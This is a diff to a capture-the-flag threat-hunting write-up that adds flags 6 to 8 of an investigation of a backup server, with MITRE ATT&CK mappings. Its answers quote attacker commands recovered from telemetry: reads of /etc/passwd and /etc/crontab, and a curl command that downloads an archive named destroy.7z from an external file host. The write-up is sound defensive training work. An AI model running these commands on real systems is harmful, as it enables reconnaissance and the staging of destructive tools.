@@ -103,9 +103,34 @@ Process execution telemetry on the backup server was analyzed for file search co
 
 Attackers enumerate local accounts to understand the system's user base.
 
+**Discovery:** After identifying file and directory discovery activity on the backup server, the investigation continued by examining whether the threat actor enumerated local user accounts. Understanding the local user base is a common reconnaissance step used to identify potential privilege escalation targets or accounts of interest.
+
 ![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/a33de4318548662444a6e869e8b9c0e03365a06c/Picture7.png)
 
-**Discovery:** TAfter identifying file and directory discovery activity on the backup server, the investigation continued by examining whether the threat actor enumerated local user accounts. Understanding the local user base is a common reconnaissance step used to identify potential privilege escalation targets or accounts of interest.
-
 **MITRE ATT&CK Mapping:** T1087.001: Account Discovery - Local Account
+
+🚩 **Answer:FLAG 6 :cat /etc/passwd**
+
+**🚩 FLAG 7:** DISCOVERY - Scheduled Job Reconnaissance
+Understanding backup schedules helps attackers time their destruction for maximum impact.
+
+**Discovery:** After identifying backup-related files, archive discovery, and local account enumeration activity on the backup server, the investigation progressed to determine whether the attacker inspected scheduled jobs to understand task execution timing. Since scheduled jobs on Linux systems are commonly defined within **cron** configuration files, process execution telemetry on the backup server was reviewed for commands that read cron configuration data.
+
+![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/bf45282865178694b6a277da25c32d4d61e8f596/Picture8.png)
+
+**MITRE ATT&CK Mapping:** T1083: File and Directory Discovery
+
+🚩 **Answer:FLAG 7 : cat /etc/crontab**
+
+**🚩 FLAG 8:** DFLAG 8: COMMAND AND CONTROL - Tool Transfer
+Attackers download tools from external infrastructure to carry out the attack.
+
+**Discovery:** After completing discovery activities on the backup server, the investigation examined whether external tools were transferred onto the system. Process execution telemetry revealed a command using curl to download an archive from external infrastructure and save it locally. The use of an attacker-defined filename, destroy.7z, indicates the tool’s intended purpose rather than the transfer method. 
+
+![Image Alt](https://github.com/Darya-cybersec/CTF-Azuki-Import-Export-Investigation/blob/00331d213d4c744974459d0d507332f93e11dddb/Picture9.png)
+
+**MITRE ATT&CK Mapping:** T1105: Ingress Tool Transfer
+
+🚩 **Answer:FLAG 8 : curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z**
+
 
